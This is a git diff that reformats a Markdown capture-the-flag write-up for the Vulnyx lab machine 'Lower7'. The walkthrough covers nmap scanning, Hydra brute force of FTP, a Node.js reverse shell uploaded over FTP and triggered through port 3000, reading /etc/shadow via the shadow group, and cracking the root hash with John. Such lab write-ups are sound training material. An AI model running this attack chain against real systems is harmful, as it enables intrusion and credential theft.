@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Lower7
+---
+icon: linux
+---
 
-**Platform:** Vulnyx  
-**Operating System:** Linux  
+# Lower7 ​
 
-> **Tags:** `Linux` `FTP` `Hydra` `Node.js` `Reverse Shell` `File Upload` `Shadow Group` `John the Ripper` 
+## 🖥️ Writeup - Lower7
 
-# INSTALLATION
+**Platform:** Vulnyx\
+**Operating System:** Linux
+
+> **Tags:** `Linux` `FTP` `Hydra` `Node.js` `Reverse Shell` `File Upload` `Shadow Group` `John the Ripper`
+
+## INSTALLATION
 
 We download the `zip` containing the `.ova` of the Lower7 machine, extract it, and import it into VirtualBox.
 
 We configure the network interface of the Lower7 machine and run it alongside the attacker machine.
 
-# HOST DISCOVERY
+## HOST DISCOVERY
 
 At this point, we still don’t know which `IP` address is assigned to Lower7, so we discover it as follows:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts                                    
                                                                                                     
@@ -34,18 +42,20 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
 
 We identify with high confidence that the victim’s IP is `10.0.4.37`.
 
-# PORT SCANNING
+## PORT SCANNING
 
 Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.37
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p21,3000 --min-rate 5000 10.0.4.37
 ```
+
 Info:
+
 ```
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 18:41 +0100
 Nmap scan report for 10.0.4.37
@@ -73,7 +83,7 @@ Name (10.0.4.37:trihack):
 
 It welcomes us as `a.clark`, which suggests this might be the `username` for `FTP` access.
 
-# BRUTE FORCE
+## BRUTE FORCE
 
 We perform a `brute force` attack to see if we can find valid credentials for the user `a.clark`.
 
@@ -82,6 +92,7 @@ hydra -l a.clark -P /usr/share/wordlists/rockyou.txt 10.0.4.37 ftp -t 50
 ```
 
 Info:
+
 ```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -117,11 +128,11 @@ ftp>
 
 Next, we check port `3000`, which is running a `HTTP` service based on `Node.js`.
 
-![alt text](../../images/nodejss.png)
+![alt text](../../.gitbook/assets/nodejss.png)
 
 The system tells us the page is working but currently has no content.
 
-# REVERSE SHELL
+## REVERSE SHELL
 
 We decide to upload a `.js` `reverse shell` via `FTP` and attempt to access it through port `3000`.
 
@@ -130,6 +141,7 @@ nano reverse.js
 ```
 
 Code:
+
 ```js
 module.exports = function() {
     var net = require("net");
@@ -174,6 +186,7 @@ http://10.0.4.37:3000/reverse.js
 ```
 
 Info:
+
 ```
 listening on [any] 4444 ...
 connect to [10.0.4.12] from (UNKNOWN) [10.0.4.37] 56148
@@ -183,28 +196,33 @@ a.clark
 
 We receive the `shell` as user `a.clark`.
 
-# TTY
+## TTY
 
 Before attempting privilege escalation, we upgrade the `TTY` for a more interactive shell:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# PRIVILEGE ESCALATION
+## PRIVILEGE ESCALATION
 
 We perform some initial enumeration and discover that user `a.clark` is a member of the `shadow` group.
 
@@ -220,6 +238,7 @@ cat /etc/shadow
 ```
 
 Info:
+
 ```
 root:$y$j9T$9VFLJjKZix0Ugj9YsoOCSxxxxxxxxxxxx6z4oYqa7YD6QyXd52jxyLD:20374:0:99999:7:::
 daemon:*:19676:0:99999:7:::
@@ -257,6 +276,7 @@ john hash.txt --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 Info:
+
 ```
 Using default input encoding: UTF-8
 Loaded 1 password hash (crypt, generic crypt(3) [?/64])
@@ -279,6 +299,7 @@ su root
 ```
 
 Info:
+
 ```
 root@lower7:/home/a.clark# whoami
 root
@@ -286,6 +307,7 @@ root@lower7:/home/a.clark#
 ```
 
 Finally, we obtain the `user flag` and the `root flag`:
+
 ```
 root@lower7:/home/a.clark# cat user.txt 
 9f903b45d270a2d0b95c68b4f3aac03f
